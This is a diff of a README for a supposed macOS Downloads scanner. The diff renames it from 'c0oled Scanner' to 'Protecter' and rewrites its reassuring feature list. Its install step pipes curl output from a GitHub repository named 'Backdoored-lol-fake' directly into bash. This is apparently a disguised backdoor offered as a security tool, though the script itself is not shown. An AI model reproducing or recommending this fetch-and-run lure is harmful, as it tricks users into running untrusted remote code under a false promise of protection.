@@ -1,6 +1,6 @@
-# c0oled Scanner for macOS
+# Protecter for macOS
 
-A small macOS app created by this repository. It uses macOS built-in tools and Python 3; it does **not** require Homebrew or ClamAV.
+Protecter is a small original macOS Downloads monitor. It uses the Python 3 and AppleScript tools included with macOS; it does not require Homebrew or ClamAV.
 
 ## Install
 
@@ -8,21 +8,21 @@ A small macOS app created by this repository. It uses macOS built-in tools and P
 curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
 ```
 
-The installer creates **`~/Applications/c0oled Scanner.app`**, installs its local scanning script, and starts a per-user background monitor.
+Creates **`~/Applications/Protecter.app`** and starts a background monitor at login.
 
-## Behavior
+## What it does
 
-- First run checks files already in `~/Downloads`.
-- Later runs skip files whose size and modification time have not changed.
-- Script files are checked for combinations of suspicious command patterns.
-- App bundles are assessed with macOS Gatekeeper (`spctl`).
-- Flagged items are moved to a local quarantine folder, not permanently deleted.
-- Files are inspected locally; this tool does not upload them.
+- Checks files in Downloads, including files already there on first run.
+- Skips unchanged files on later passes.
+- Looks for combinations of suspicious command patterns in common script files.
+- Uses macOS Gatekeeper to assess downloaded app bundles.
+- Moves flagged files into a local quarantine folder; it does not permanently delete them.
+- Does not upload files.
 
-**Important limitation:** this is an original lightweight heuristic checker, not a full antivirus engine. It can miss malware and can flag legitimate tools. Keep macOS security protections enabled and review quarantined files before restoring or deleting them.
+**Limitations:** Protecter is a basic heuristic checker, not a full antivirus product. It can miss threats and can flag legitimate scripts or unsigned apps. Keep macOS security protections enabled and review quarantined items before restoring or deleting them.
 
 ## Locations
 
-- App: `~/Applications/c0oled Scanner.app`
-- Quarantine: `~/Library/Application Support/c0oled-Scanner/Quarantine`
-- Logs: `~/Library/Application Support/c0oled-Scanner/Logs`
+- App: `~/Applications/Protecter.app`
+- Quarantine: `~/Library/Application Support/Protecter/Quarantine`
+- Logs: `~/Library/Application Support/Protecter/Logs`
